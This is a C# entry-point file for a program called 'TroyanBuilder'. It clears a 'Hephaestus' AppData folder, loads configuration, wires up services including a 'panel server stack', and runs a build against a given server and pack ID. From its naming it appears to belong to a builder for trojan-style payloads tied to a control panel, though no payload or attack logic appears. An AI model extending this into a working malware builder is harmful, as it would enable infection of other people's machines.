using Commons;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Options;
using model;
using Troyan.Core;

namespace TroyanBuilder;

public static class Program
{
    static void Clean()
    {
        var path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Hephaestus");

        if (Directory.Exists(path))
        {
            foreach (var file in Directory.GetFiles(path)) File.Delete(file);
            foreach (var dir in Directory.GetDirectories(path)) Directory.Delete(dir, true);
            Console.WriteLine("Contents deleted.");
        }

    }

    static void Main(string[] args)
    {
        string server = args.Length > 0 ? args[0] : Dev.Mode;
        if (args.Length >= 1)
        {
            server = args[0];
        }
        var packId = args.Length >= 2 ? args[1] : "";
        Console.WriteLine("Starting Troyan Builder: server:" + server + " packId:" + packId + " (release + debug)");

        Clean();
        var config = new ConfigurationBuilder()
            .SetBasePath(AppContext.BaseDirectory)
            .AddJsonFile("appsettings.json", optional: false)
            .Build();

        var services = new ServiceCollection();
        services.AddSingleton<IValidateOptions<DomainHostOptions>, DomainHostOptionsValidator>();
        services.AddOptions<DomainHostOptions>()
            .Bind(config.GetRequiredSection(DomainHostOptions.SectionName))
            .ValidateOnStart();
        services.AddSingleton<IHephaestusPathResolver, HephaestusPathResolver>();
        services.AddPanelServerStack();
        services.AddTroyanCore();

        using var provider = services.BuildServiceProvider();
        var panelService = provider.GetRequiredService<ServerService>();
        provider.GetRequiredService<ITroyanBuildRunner>().Run(server, packId, panelService);
    }
}
